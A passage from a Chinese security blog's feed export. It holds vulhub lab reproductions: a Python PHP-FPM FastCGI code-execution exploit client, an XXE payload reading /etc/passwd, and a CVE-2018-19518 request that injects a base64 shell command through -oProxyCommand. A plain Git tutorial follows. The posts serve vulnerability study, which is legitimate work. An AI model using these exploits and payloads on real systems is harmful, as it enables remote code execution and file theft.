+ bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):</span><br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):</span><br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):</span><br>        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(self.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = self.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;auto_prepend_file = php://input&#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    response = client.request(params, content)<br>    <span class="hljs-built_in">print</span>(force_text(response))<br></code></pre></div></td></tr></table></figure><p>执行结果：</p><p><img src="https://img-blog.csdnimg.cn/20210322134916856.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>信安 复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP环境XML外部实体注入防御(XXE)</title>
    <link href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%E7%8E%AF%E5%A2%83XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1(XXE)/"/>
    <url>/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%E7%8E%AF%E5%A2%83XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1(XXE)/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP环境XML外部实体注入防御（XXE）"><a href="#PHP环境XML外部实体注入防御（XXE）" class="headerlink" title="PHP环境XML外部实体注入防御（XXE）"></a>PHP环境XML外部实体注入防御（XXE）</h1><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>PHP 7.0.30<br>libxml 2.8.0</p><p>为了演示PHP环境下的XXE漏洞，本例将libxml2.8.0版本编译进PHP中。PHP 版本并不影响XXE利用。</p><p>使用如下命令编译并启动环境：</p><div class="hljs code-wrapper"><pre><code>cd vulhub/php/php_xxedocker-compose up -d</code></pre></div><p>web目录如下</p><div class="hljs code-wrapper"><pre><code>$ tree ..├── dom.php # 示例：使用DOMDocument解析body├── index.php├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</code></pre></div><p>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。<br>如dom.php代码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br><span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$data</span>);<br><br>print_r(<span class="hljs-variable">$dom</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>其中file_get_contents(“php://input”)：<br>php://input 是可以访问请求的原始数据的只读流。<br> POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。<br> 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。<br> enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>1, php://input 可以读取http entity body中指定长度的值,由Content-Length指定长度,不管是POST方式或者GET方法提交过来的数据。但是，一般GET方法提交数据 时，http request entity body部分都为空。<br>2,php://input 与$HTTP_RAW_POST_DATA读取的数据是一样的，都只读取Content-Type不为multipart/form-data的数据。</p><p>知识点:<br> 1，Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST<br>2，PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA<br>3, 只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。填入的长度，由Coentent-Length指定。<br>4，只有Content-Type为application/x-www-data-urlencoded时，php://input数据才跟$_POST数据相一致。<br>5，php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini<br> 6，PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。<br>7、file_get_contents(“php://input”)就可以获取非 enctype=”multipart/form-data”提交过来的数据<br>8、@file_get_contents(“php://input”)加上@是屏蔽对应的错误<br>9、json_decode( @file_get_contents(“php://input”) ，true)，由于我们与前端协定的数据是json,所以我们对接收到的数据内容进行json解析，以便抓取对应的数据进行使用。</p><p>Simple XXE Payload：</p><div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></div><p>抓包后进行修改利用<a href="https://blog.csdn.net/bylfsj/article/details/101441734">XXE注入</a>获取任何想要的文件内容<br>如图<br><img src="https://img-blog.csdnimg.cn/20210321195359703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>信安 复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 远程命令执行漏洞(CVE-2018-19518)</title>
    <link href="/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-19518)/"/>
    <url>/2021/07/10/%E4%BF%A1%E5%AE%89/%E5%A4%8D%E7%8E%B0/PHP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-19518)/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-远程命令执行漏洞（CVE-2018-19518）"><a href="#PHP-远程命令执行漏洞（CVE-2018-19518）" class="headerlink" title="PHP 远程命令执行漏洞（CVE-2018-19518）"></a>PHP 远程命令执行漏洞（CVE-2018-19518）</h1><h1 id="详细信息"><a href="#详细信息" class="headerlink" title="详细信息"></a>详细信息</h1><p>   在PHP和其他产品的imap_open（）中使用的UNIX上的华盛顿大学IMAP工具包2007f启动rsh命令（借助于c-client / imap4r1.c中的imap_rimap函数和osdep / unix / tcp_unix中的tcp_aopen函数.c），而不会阻止参数注入，如果IMAP服务器名称是不受信任的输入（例如，由Web应用程序的用户输入），并且rsh已被具有不同参数的程序替换，则远程攻击者可能会执行任意OS命令语义。 例如，如果rsh是ssh的链接（如在Debian和Ubuntu系统上看到的），则攻击可以使用包含“ -oProxyCommand”参数的IMAP服务器名称。 </p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>PHP 5.6.0版本至5.6.38版本</p><p>7.0.0版本至7.0.32版本</p><p>7.1.0版本至7.1.24版本</p><p>7.2.0版本至7.2.12版本</p><p>Debian Linux 8.0版本，9.0版本</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>使用vulhub</p><div class="hljs code-wrapper"><pre><code>cd vulhub/php/CVE-2018-19518</code></pre></div><p>使用docker启动</p><div class="hljs code-wrapper"><pre><code>docker-compose builddocker-compose up -d</code></pre></div><p>环境启动后，访问</p><div class="hljs code-wrapper"><pre><code>127.0.0.1:8080</code></pre></div><p>抓包，修改</p><div class="hljs code-wrapper"><pre><code>POST / HTTP/1.1Host: **:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 113Connection: closeUpgrade-Insecure-Requests: 1hostname=x+-oProxyCommand%3decho%09ZWNobyAnSGVsbG8nPi90bXAvdGVzdA%3d%3d|base64%09-d|sh&#125;&amp;username=111&amp;password=222</code></pre></div><p>其中x+暂时不清楚意义，-oProxyCommand 表示使用该参数。<a href="https://github.com/kennylevinsen/sshmuxd/wiki/ProxyCommand">ProxyCommmand</a>相关知识<br>%09后进行base64编码的内容 如：echo ‘Hello’&gt;/tmp/test<br>再将部分进行url编码。</p><p>进入对应的容器</p><div class="hljs code-wrapper"><pre><code>docker ps -adocker exec -it ID /bin/bashcd /tmpcat test</code></pre></div><p>可见对应的Hello输出说明创建成功。</p><p>关闭镜像（每次用完后关闭）</p><div class="hljs code-wrapper"><pre><code>docker-compose down</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>信安 复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GIT 基本使用</title>
    <link href="/2021/07/10/Git/GIT%20%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/07/10/Git/GIT%20%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="git-安装及常用命令"><a href="#git-安装及常用命令" class="headerlink" title="git 安装及常用命令"></a>git 安装及常用命令</h1><h1 id="一-本地管理"><a href="#一-本地管理" class="headerlink" title="一.本地管理"></a>一.本地管理</h1><ol><li>安装完成后必要的设置<br>$ git config –global user.name “Your Name”<br>$ git config –global user.email “邮箱地址“</li></ol><p>注意：git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p><ol start="2"><li><p>创建版本库<br>打开git界面后<br>$ git init //表示将该目录设置为git可以管理的仓库</p><p>切换分支<code>git checkout -b (本地创建分支) origin/库名</code></p></li><li><p>上传命令<br>$ git add 文件名<br>$ git commit -m “对于该次上传的备注”<br>注意：<br>因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如：<br>$ git add file1.txt<br>$ git add file2.txt file3.txt<br>$ git commit -m “add 3 files.”</p></li><li><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/896954074659008">状态命令</a><br>要随时掌握工作区的状态，使用git status命令。<br>如果git status告诉你有文件被修改过，用git diff可以查看修改内容。</p></li><li><p>版本回退<br>$git log<br>$git log –pretty=oneline<br>展示内容：<br>e475afc93c209a690c39c13a46716e8fa000c366(版本号) add distributed(备注)<br>退回版本<br>$ git reset –hard 版本号（修改后使用给git log 无法查看最新的版本最新的就是当前版本）<br>此处版本号（版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，因为Git可能会找到多个版本号，就无法确定是哪一个了。）</p><p>$git reflog用来记录你的每一次命令：可以获取之前版本的版本号</p></li><li><p>工作区及暂存区，暂存是git add时存在<br>当文件没有add时使用<br> git checkout – 文件名 //让这个文件回到最近一次git commit或git add时的状态。<br> 当文件add后使用<br> git reset HEAD &lt;file&gt; //git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。<br> 此时的readme.txt文件回到了没有使用add的状态</p></li><li><p>删除文件<br>直接删除文件git status会有记录<br>git rm 文件名<br>git commit -m “备注”</p></li></ol><h1 id="二-远程仓库"><a href="#二-远程仓库" class="headerlink" title="二.远程仓库"></a>二.远程仓库</h1><ol><li><p>添加远程库<br>创建SSH Key。<br>在用户主目录下(C:/users/用户名/)，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p><p>$ ssh-keygen -t rsa -C “<a href="mailto:&#x79;&#111;&#117;&#x72;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;">&#x79;&#111;&#117;&#x72;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;</a>“</p><p>按照默认设置，文件将存储在C:/users/用户名/.ssh中，读取**.pub文件</p><p>设置对应github的ssh密钥</p><ol><li><p>首先进入对应设置</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210808161840.png"></p></li><li><p>选择SSH and GPG keys</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210808162311.png"></p></li><li><p>添加New SSH Key<br> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210808162446.png"></p><p>在key的位置输入生成的**.pub中的内容即可</p></li><li><p>最后使用命令<code> ssh -T git@github.com</code>进行验证</p><p>  You’ve successfully authenticated, but GitHub does not provide shell access.</p><p>  表示成功</p></li></ol></li><li><p>关联自己的github<br>$ git remote add origin <a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#105;&#x74;&#104;&#117;&#98;&#46;&#99;&#111;&#109;">&#103;&#105;&#116;&#x40;&#103;&#105;&#x74;&#104;&#117;&#98;&#46;&#99;&#111;&#109;</a>:自己的github账户名/（建立的库名）.git</p><p>将远程库**分支上的代码拉取到本地<br>  <code>git fetch origin **</code></p><p>把本地库的所有内容推送到远程库上<br> $ git push -u origin master(当前分支)<br>查看远程库<br> $ git remote -v<br> 删除远程库<br> $ git remote rm 名称</p></li><li><p>从远程库克隆<br>$git clone https:.git/<a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109;</a>:/其他</p></li></ol><h1 id="三-遇到的问题小结"><a href="#三-遇到的问题小结" class="headerlink" title="三.遇到的问题小结"></a>三.遇到的问题小结</h1><p><strong>! [remote rejected] master -&gt; master (hook declined)</strong></p><p>经过查询了解到：</p><p>git push不上去的原因在于所push的分支权限为protected,只有项目的管理员或者项目的管理员指派的具有相应权限的人才能进行push,要进行项目的push,有如下两种方法：</p><ol><li><p>将所要push的内容所在的分支的protected权限关闭</p><ol><li>进入所在项目的settings</li><li>点击进入Protected branches,点击unprotected将master分支的权限改变，即关闭master的protected权限</li></ol></li><li><p>新建其它分支，将项目push到新建的分支上，后期再进行merge</p><ol><li><p>新建分支</p> <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs git">git branch 分支名<br></code></pre></div></td></tr></table></figure></li><li><p>切换分支</p> <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs git">git checkout 分支名<br></code></pre></div></td></tr></table></figure></li><li><p>进行项目上传</p> <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs git">git add .<br><br>git commit -m &quot;提交的信息&quot;<br><br>git remote add origin 远程仓库地址<br><br>git push -u origin 分支名<br></code></pre></div></td></tr></table></figure></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2021/07/10/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/ssti/"/>
    <url>/2021/07/10/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/ssti/</url>
    
